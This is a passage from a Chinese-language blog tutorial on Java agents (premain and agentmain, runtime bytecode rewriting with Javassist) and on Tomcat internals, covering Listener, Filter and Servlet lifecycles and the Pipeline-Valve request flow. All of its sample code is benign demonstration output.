<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PremainAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain invoke!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、在resources包下创建META-INF/MANIFEST.MF文件，并写入如下内容(记得多敲一个回车)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: org.example.PremainAgent</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20220212152827701.png" alt="image-20220212152827701"></p>
<p><img src="image-20220212152843420.png" alt="image-20220212152843420"></p>
<p>3、打包成jar包PremainAgent.jar</p>
<p><img src="image-20220212152930191.png" alt="image-20220212152930191"></p>
<p><img src="image-20220212153005406.png" alt="image-20220212153005406"></p>
<p><img src="image-20220212153028959.png" alt="image-20220212153028959"></p>
<p><img src="image-20220212153042806.png" alt="image-20220212153042806"></p>
<p><img src="image-20220212153132295.png" alt="image-20220212153132295"></p>
<p><img src="image-20220212153213669.png" alt="image-20220212153213669"></p>
<p>4、编写HelloWorld主程序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello,World!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5、打包成HelloWorld.jar包</p>
<p>这里注意一下设置main class</p>
<p><img src="image-20220212154907346.png" alt="image-20220212154907346"></p>
<p>6、命令行运行java -javaagent:PremainAgent.jar -jar HelloWorld.jar</p>
<p><img src="image-20220212154752256.png" alt="image-20220212154752256"></p>
<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">VirtualMachine</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获得当前所有的JVM列表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;VirtualMachineDescriptor&gt; <span class="title">list</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pid连接到JVM</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> VirtualMachine <span class="title">attach</span><span class="params">(String id)</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开连接</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">detach</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadAgent</span><span class="params">(String agent)</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Instrumentation 常用方法如下：</p>
<ol>
<li>void addTransformer(ClassFileTransformer transformer, boolean canRetransform);<br> 增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</li>
<li>void  redefineClasses(ClassDefinition… definitions) hrows  ClassNotFoundException, UnmodifiableClassException;<br> 在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。</li>
<li>boolean removeTransformer(ClassFileTransformer transformer);<br> 删除一个类转换器</li>
<li>void  retransformClasses(Class&lt;?&gt;… classes) throws UnmodifiableClassException<br> 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</li>
</ol>
<h4 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h4><p>agentmain与premain不同在于，agentmain可以在程序执行时加载，下面就来实现一下程序执行时修改程序字节码</p>
<p>1、创建主程序（也就是被修改的类），无线循环打印<code>Hello,Word!!!</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Run run = <span class="keyword">new</span> Run();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            run.HelloWord();</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HelloWord</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello,Word!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、创建一个AgentMain类以及TransformerDemo内部类，TransformerDemo内部类实现ClassFileTransformer接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain invoke ! ! !&quot;</span>);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();<span class="comment">//获取所有加载的class</span></span><br><span class="line">        <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (aClass.getName().equals(TransformerDemo.editClassName)) &#123;</span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> TransformerDemo(), <span class="keyword">true</span>);<span class="comment">//添加 Transformer</span></span><br><span class="line">                inst.retransformClasses(aClass);<span class="comment">// 触发 Transformer</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransformerDemo</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//需要修改的类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String editClassName = <span class="string">&quot;org.example.Run&quot;</span>;</span><br><span class="line">    <span class="comment">//修改的方法名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String editMethod = <span class="string">&quot;HelloWord&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();<span class="comment">//获取的 ClassPool 使用 JVM 的类搜索路径。</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="keyword">null</span>) &#123;</span><br><span class="line">                ClassClassPath ccp = <span class="keyword">new</span> ClassClassPath(classBeingRedefined);</span><br><span class="line">                cp.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line">            CtClass ctc = cp.get(editClassName);<span class="comment">//获取需要修改的类的Class对象</span></span><br><span class="line">            CtMethod method = ctc.getDeclaredMethod(editMethod);<span class="comment">//获取方法</span></span><br><span class="line">            String source = <span class="string">&quot;&#123;System.out.println(\&quot;Hello transformer!!!\&quot;);&#125;&quot;</span>;</span><br><span class="line">            method.setBody(source);<span class="comment">//设置方法体</span></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = ctc.toBytecode();</span><br><span class="line">            ctc.detach();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、在resources包下创建META-INF/MANIFEST.MF文件，并写入如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Agent-Class: org.example.AgentMain</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4、将AgentMain打包成jar包agentmain.jar</p>
<p>5、编写attachmain用于调用Attach API 实现启动后加载</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (VirtualMachineDescriptor descriptor : VirtualMachine.list()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (descriptor.displayName().equals(<span class="string">&quot;org.example.Run&quot;</span>)) &#123;<span class="comment">//判断类名是否为修改的类</span></span><br><span class="line">            VirtualMachine virtualMachine = VirtualMachine.attach(descriptor.id());<span class="comment">//根据pid连接需要修改的类</span></span><br><span class="line">            virtualMachine.loadAgent(<span class="string">&quot;C:\\IdeaProjects\\tomcatdebug\\agentmain\\out\\artifacts\\agentmain_jar\\agentmain.jar&quot;</span>);<span class="comment">//加载agentmain.jar</span></span><br><span class="line">            virtualMachine.detach();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>6、先启动主程序Run，开始打印Hello,Word!!!</p>
<p><img src="image-20220212164144742.png" alt="image-20220212164144742"></p>
<p>7、启动attachmain加载agentmain.jar，实现修改Run.HelloWord方法字节码</p>
<p><img src="image-20220212164410046.png" alt="image-20220212164410046"></p>
<h3 id="Tomcat基础知识"><a href="#Tomcat基础知识" class="headerlink" title="Tomcat基础知识"></a>Tomcat基础知识</h3><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><blockquote>
<p>JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p>
</blockquote>
<p><strong>生命周期</strong></p>
<p>以ServletRequestListener为例，ServletRequestListener主要用于监听ServletRequest对象的创建和销毁,一个ServletRequest可以注册多个ServletRequestListener接口。</p>
<ul>
<li>每次请求创建时调用requestInitialized()。</li>
<li>每次请求销毁时调用requestDestroyed()。</li>
</ul>
<p>代码实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListenerDemo</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//每次请求创建时调用</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请求创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//每次请求销毁时调用</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请求销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><blockquote>
<p>filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</p>
</blockquote>
<p><strong>生命周期</strong></p>
<p>自定义Filter的实现，需要实现javax.servlet.Filter下的init()、doFilter()、destroy()三个方法。</p>
<ul>
<li>启动服务器时加载过滤器的实例，并调用init()方法来初始化实例；</li>
<li>每一次请求时都只调用方法doFilter()进行处理；</li>
<li>停止服务器时调用destroy()方法，销毁实例。</li>
</ul>
<p>代码实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FilterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;doFilter执行&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><blockquote>
<p>servlet是一种运行服务器端的java应用程序，具有独立于平台和协议的特性，并且可以动态的生成web页面，它工作在客户端请求与服务器响应的中间层。Servlet 的主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。    </p>
</blockquote>
<p><strong>生命周期</strong></p>
<p>Servlet 的生命周期开始于Web容器的启动时，它就会被载入到Web容器内存中，直到Web容器停止运行或者重新装入servlet时候结束。这里也就是说明，一旦Servlet被装入到Web容器之后，一般是会长久驻留在Web容器之中。</p>
<ul>
<li>装入：启动服务器时加载Servlet的实例</li>
<li>初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有init()方法负责执行完成</li>
<li>调用：从第一次到以后的多次访问，都是只调用doGet()或doPost()方法</li>
<li>销毁：停止服务器时调用destroy()方法，销毁实例</li>
</ul>
<p>代码实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Servlet执行....&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>web.xml对于这三种组件的加载顺序是：listener -&gt; filter -&gt; servlet，也就是说listener的优先级为三者中最高的。</em></p>
<h4 id="Container-结构"><a href="#Container-结构" class="headerlink" title="Container 结构"></a>Container 结构</h4><p>Tomcat设计了4种容器，分别是Engine、Host、Context和Wrapper。这4种容器是父子关系。 Tomcat通过一种分层的架构，使得Servlet容器具有很好的灵活性。</p>
<p><img src="image-20220116105827112.png" alt="image-20220116105827112"></p>
<p><strong>各个组件的含义 ：</strong></p>
<p>Engine:</p>
<blockquote>
<p>表示整个Catalina的Servlet引擎，用来管理多个虚拟站点，一个Service最多只能有一个Engine，但是一个引擎可包含多个Host </p>
</blockquote>
<p>Host:</p>
<blockquote>
<p>代表一个虚拟主机，或者说一个站点，可以给Tomcat配置多个虚拟主机地址，而一个虚拟主机下可包含多个Context</p>
</blockquote>
<p>Context:</p>
<blockquote>
<p>表示一个Web应用程序， 一个Web应用可包含多个Wrapper</p>
</blockquote>
<p>Wrapper:</p>
<blockquote>
<p>表示一个Servlet，Wrapper 作为容器中的最底层，不能包含子容器</p>
</blockquote>
<h4 id="Container请求处理流程"><a href="#Container请求处理流程" class="headerlink" title="Container请求处理流程"></a>Container请求处理流程</h4><p>Container处理请求是使用Pipeline-Valve管道来处理的！（Valve是阀门之意）</p>
<p>Pipeline-Valve是责任链模式，责任链模式是指在一个请求处理的过程中有很多处理者依次对请求进行处理，每个处理者负责做自己相应的处理，处理完之后将处理后的请求返回，再让下一个处理着继续处理。</p>
<p>但是！Pipeline-Valve使用的责任链模式和普通的责任链模式有些不同！区别主要有以下两点：</p>
<ol>
<li><p>每个Pipeline都有特定的Valve，而且是在管道的最后一个执行，这个Valve叫做BaseValve，BaseValve是不可删除的；</p>
</li>
<li><p>在上层容器的管道的BaseValve中会调用下层容器的管道。</p>
</li>
</ol>
<p>我们知道Container包含四个子容器，而这四个子容器对应的BaseValve分别在：StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve。</p>
<p>Pipeline的处理流程图如下：</p>
<p><img src="image-20220118170335236.png" alt="image-20220118170335236"></p>
<ol>
<li>Connector在接收到请求后会首先调用最顶层容器的Pipeline来处理，这里的最顶层容器的Pipeline就是EnginePipeline（Engine的管道）；</li>
<li>在Engine的管道中依次会执行EngineValve1、EngineValve2等等，最后会执行StandardEngineValve，在StandardEngineValve中会调用Host管道，然后再依次执行Host的HostValve1、HostValve2等，最后在执行StandardHostValve，然后再依次调用Context的管道和Wrapper的管道，最后执行到StandardWrapperValve。</li>
<li>当执行到StandardWrapperValve的时候，会在StandardWrapperValve中创建FilterChain，并调用其doFilter方法来处理请求，这个FilterChain包含着我们配置的与请求相匹配的Filter和Servlet，其doFilter方法会依次调用所有的Filter的doFilter方法和Servlet的service方法，这样请求就得到了处理！</li>
<li>当所有的Pipeline-Valve都执行完之后，并且处理完了具体的请求，这个时候就可以将返回的结果交给Connector了，Connector在通过Socket的方式将结果返回给客户端。</li>
</ol>
<h4 id="Container请求处理流程源码分析"><a href="#Container请求处理流程源码分析" class="headerlink" title="Container请求处理流程源码分析"></a>Container请求处理流程源码分析</h4><p>这里只是对Container的处理流程分析，所以直接找到连接器（Connector）和容器（Container）相连的<strong>Adapter</strong>组件的实现类CoyoteAdapter，CoyoteAdapter负责将Tomcat Request转成ServletRequest，再调用容器的Service方法。</p>
<p>Service方法</p>
<p><img src="image-20220121151928456.png" alt="image-20220121151928456"></p>
<p>直接看关键代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure>

<p>connector.getService() 获取的是当前 connector 关联的 Service 组件，默认情况下获得的就<code>org.apache.catalina.core.StandardService</code>的对象。</p>
<p><img src="image-20220119152529080.png" alt="image-20220119152529080"></p>
<p>getContainer 方法获得的是<code>org.apache.catalina.core.StandardEngine</code>的对象，这里为什么能获取到StandardEngine对象涉及到了Java 解析 xml 文件，通过Digester 对象所包含的解析规则生成相应对象。这里不做深入研究。</p>
<p><img src="image-20220119152622420.png" alt="image-20220119152622420"></p>
<p>紧接着的 getPipeline 方法返回的是 StandardEngine 类的父类<code>org.apache.catalina.core.ContainerBase</code>类的成员变量 pipeline</p>
<p><img src="image-20220119153140381.png" alt="image-20220119153140381"></p>
<p><img src="image-20220119153212066.png" alt="image-20220119153212066"></p>
<p><img src="image-20220119153233159.png" alt="image-20220119153233159"></p>
<p>所以 connector.getService().getContainer().getPipeline() 方法返回的是<code>org.apache.catalina.core.StandardPipeline</code>类的对象</p>
<p>该对象就是前面提到的管道（ Pipeline ）。所有的管道类都会实现<code>org.apache.catalina.Pipeline</code>这个接口，看下这个接口中定义的方法：</p>
<p><img src="image-20220119153942546.png" alt="image-20220119153942546"></p>
<p>Tomat中一个管道包含多个阀（ Valve ），这些阀共分为两类，一类叫基础阀（通过 getBasic、setBasic 方法调用），一类是普通阀（通过 addValve、removeValve 调用）。管道都是包含在一个容器当中，所以 API 里还有 getContainer 和 setContainer 方法。一个管道一般有一个基础阀（通过 setBasic 添加），可以有 0 到多个普通阀（通过 addValve 添加）。</p>
<p>所有的阀类都会实现<code>org.apache.catalina.Valve</code>这个接口，看下这个接口中定义的方法：</p>
<p><img src="image-20220119154118692.png" alt="image-20220119154118692"></p>
<p>重点关注 setNext、getNext、invoke 这三个方法，通过setNext设置该阀的下一阀，通过 getNext 返回该阀的下一个阀的引用，invoke 方法则执行该阀内部自定义的请求处理代码。</p>
<p>Tomcat里 Pipeline 的默认实现类是<code>org.apache.catalina.core.StandardPipeline</code>，其内部有三个成员变量：basic、first、container 。Pipeline 内部维护 first 和 basic 两个阀，其它相关阀通过 getNext 来获取。</p>
<p>继续看connector.getService().getContainer().getPipeline().getFirst()方法getFirst的实现：</p>
<p><img src="image-20220119154517479.png" alt="image-20220119154517479"></p>
<p>如果管道中有普通阀则返回普通阀链条最开始的那个，否则就返回基础阀。</p>
<p>那么就来看看 StandardEngine 类的管道中的基础阀的代码实现。先看下该基础阀设置的代码，在<code>org.apache.catalina.core.StandardEngine</code>对象的构造函数中：</p>
<p><img src="image-20220119154720296.png" alt="image-20220119154720296"></p>
<p>第 67行即设置基础阀。所以<code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response) </code>类的 invoke 方法会执行到 org.apache.catalina.core.StandardEngineValve 类的 invoke 方法</p>
<p><img src="image-20220119154859255.png" alt="image-20220119154859255"></p>
<p>从请求对象中取出该请求关联的 Hsost（默认情况下是<code>org.apache.catalina.core.StandardHost</code>对象），经过上述代码分析应该可以看出87行会先判断StandardPipeline对象的first属性是否为null，不为null，则返回first对象，所以这里应该是执行AbstractAccessLogValve的invoke方法。</p>
<p><img src="image-20220119172634689.png" alt="image-20220119172634689"></p>
<p><img src="image-20220119172804432.png" alt="image-20220119172804432"></p>
<p>通过 getNext 返回该阀的下一个阀的引用</p>
<p><img src="image-20220119172907602.png" alt="image-20220119172907602"></p>
<p>获取到ErrorReportValve，调用ErrorReportValve的invoke方法</p>
<p><img src="image-20220119172951865.png" alt="image-20220119172951865"></p>
<p>再通过 getNext 返回该阀的下一个阀的引用</p>
<p><img src="image-20220119173132977.png" alt="image-20220119173132977"></p>
<p>这里返回StandardHostValve，就会调用StandardHostValve的invoke方法。</p>
<p><img src="image-20220119173958993.png" alt="image-20220119173958993"></p>
<p>第137 行，会调用该请求相关的 Context 的管道内所有的阀的 invoke 方法，默认情况下 Context 是<code>org.apache.catalina.core.StandardContext</code>类的对象，其构造方法中设置了管道的基础阀</p>
<p><img src="image-20220119174240876.png" alt="image-20220119174240876"></p>
<p>所以无论有多少个Valve最后都会调用StandardContextValve的invoke方法，</p>
<p><img src="image-20220119174548765.png" alt="image-20220119174548765"></p>
